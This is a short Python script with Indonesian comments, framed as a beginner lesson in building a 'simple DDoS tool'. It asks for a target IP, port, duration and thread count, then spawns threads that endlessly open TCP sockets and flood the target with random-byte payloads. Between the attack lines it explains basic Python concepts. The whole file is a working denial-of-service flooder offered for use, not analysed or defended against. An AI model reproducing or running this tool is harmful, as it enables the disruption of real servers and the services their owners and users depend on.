# Belajar membuat simple tools ddos
# Python dasar
# Import module nya
import socket
import threading
import random

#def nya
def main():
    global ip
    global port
    global times
    global threads
    #Input ip,port,times,threads dengan int(input) atau str(input)
    ip = str(input("Enter Ip: "))
    port = int(input("Enter Port: "))
    times = int(input("Enter Time: "))
    threads = int(input("Enter Threads: "))

#launch nya
# Apa itu def? Def adalah cara untuk mendefinisikan suatu fungsi dalam Python. 
# Fungsi adalah blok kode yang dapat dipanggil berkali-kali dengan input yang berbeda. 
# Fungsi memungkinkan pemrogram untuk mengorganisir dan membagi kode mereka menjadi bagian-bagian yang lebih kecil dan lebih mudah dikelola.

def run():
    #biarin aja random.randint nya wkwkkw
    #bagi yg kepo random.randint nih makna fungsi nya
    # Fungsi random. randint() menghasilkan angka acak dengan tipe data integer yang berada pada rentang yang telah ditentukan.
    # misal awal 1024 sampe batas 8192 tapi acak2 sampe 6435 gitu ya
    packet = random.randint(1024, 8192)
    data = random._urandom(packet)
    while True: #while true adalah while loop seprti print yang berulang2 secara tak henti :)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            addr = (str(ip),int(port))
            s.sendto(data,addr)
            s.sendto(data,addr)
            s.sendto(data,addr)
            for x in range(times):
                #range untuk hasilin angka deret ke times nya semacam 1337 atau 99999
                s.sendto(data,addr)
                s.sendto(data,addr)
                s.sendto(data,addr)
                # bagi yg belom tau print, nih ya
                #print itu untuk memunculkan output seperti mau tampilin tulisan
                print(f"ATTACK SENDED TO {ip}:{port}")
        #konsep yang digunakan untuk menangani error atau except yaitu except
        except socket.error:
                print(f"ATTACK SENDED TO {ip}:{port}")
                s.close()

try:
    # if __name__ == "__main__" untuk menentukan baris tertentu manakah yang akan dijalankan ketika script berbentuk file kita jalankan, 
    # tapi tidak ketika fungsi tersebut diimport dalam bentuk module ke dalam file script lain.
    if __name__ == "__main__":
        main()
    for _ in range(threads):
        th = threading.Thread(target=run)
        th.start()
except KeyboardInterrupt:
    print("Stopping Attack..")